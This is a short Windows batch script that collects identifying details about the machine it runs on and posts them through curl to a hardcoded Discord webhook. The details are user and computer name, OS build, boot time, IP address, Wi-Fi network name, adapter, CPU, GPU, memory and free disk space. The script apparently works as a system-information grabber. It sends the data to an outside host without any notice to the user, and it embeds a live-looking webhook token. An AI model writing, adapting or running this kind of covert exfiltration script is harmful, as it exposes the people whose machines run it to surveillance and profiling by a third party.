@echo off
setlocal EnableDelayedExpansion

:: Set your webhook URL
set "webhook=https://discord.com/api/webhooks/1359806025942700193/fBp_XgC4IwApbJ7LoJiXXNQtSJAEczCTK_hG5lQaXc5z-pdMJ3EX4MQLDsrqsvx-DXL3"

:: Basic user/system info
set "username=%USERNAME%"
set "computername=%COMPUTERNAME%"
set "architecture=%PROCESSOR_ARCHITECTURE%"

:: OS version and build
for /f "tokens=2*" %%a in ('ver') do set "osversion=%%b"
for /f "tokens=2 delims==" %%a in ('wmic os get BuildNumber /value') do set "osbuild=%%a"

:: IP address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4 Address"') do set "ip=%%a"
set "ip=%ip:~1%"

:: Wi-Fi SSID
for /f "tokens=3" %%a in ('netsh wlan show interfaces ^| findstr "SSID"') do set "wifi=%%a"

:: Network adapter
for /f "tokens=1,2,*" %%a in ('netsh interface show interface ^| findstr "Connected"') do set "adapter=%%c"

:: Memory
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr "Total Physical Memory"') do set "totalMemory=%%a"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr "Available Physical Memory"') do set "freeMemory=%%a"

:: Disk space
for /f "tokens=3" %%a in ('dir C:\ ^| findstr "bytes free"') do set "freeSpace=%%a"

:: CPU load
for /f %%a in ('wmic cpu get loadpercentage ^| findstr /r "[0-9]"') do set "cpuload=%%a%%"

:: CPU model info
for /f "tokens=2 delims==" %%a in ('wmic cpu get caption /value') do set "cpuModel=%%a"

:: GPU info
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value') do set "gpuModel=%%a"

:: Boot time
for /f "tokens=2 delims==" %%a in ('wmic os get LastBootUpTime /value') do set "boottime=%%a"
set "boottime=!boottime:~0,4!-!boottime:~4,2!-!boottime:~6,2! !boottime:~8,2!:!boottime:~10,2!:!boottime:~12,2!"

:: Format message as a Discord code block
set "message=```WeebHook System Report:"
set "message=!message!\nUser: %username%"
set "message=!message!\nPC: %computername%"
set "message=!message!\nOS: %osversion% (Build %osbuild%)"
set "message=!message!\nBoot Time: %boottime%"
set "message=!message!\nIP: %ip%"
set "message=!message!\nWi-Fi: %wifi%"
set "message=!message!\nAdapter: %adapter%"
set "message=!message!\nCPU Model: %cpuModel%"
set "message=!message!\nCPU Load: %cpuload%"
set "message=!message!\nGPU Model: %gpuModel%"
set "message=!message!\nMemory: %freeMemory% free / %totalMemory% total"
set "message=!message!\nDisk Free (C:): %freeSpace%"
set "message=!message!```"

:: Send to webhook
curl -X POST -H "Content-Type: application/json" --data "{\"content\": \"!message!\"}" %webhook%

endlocal
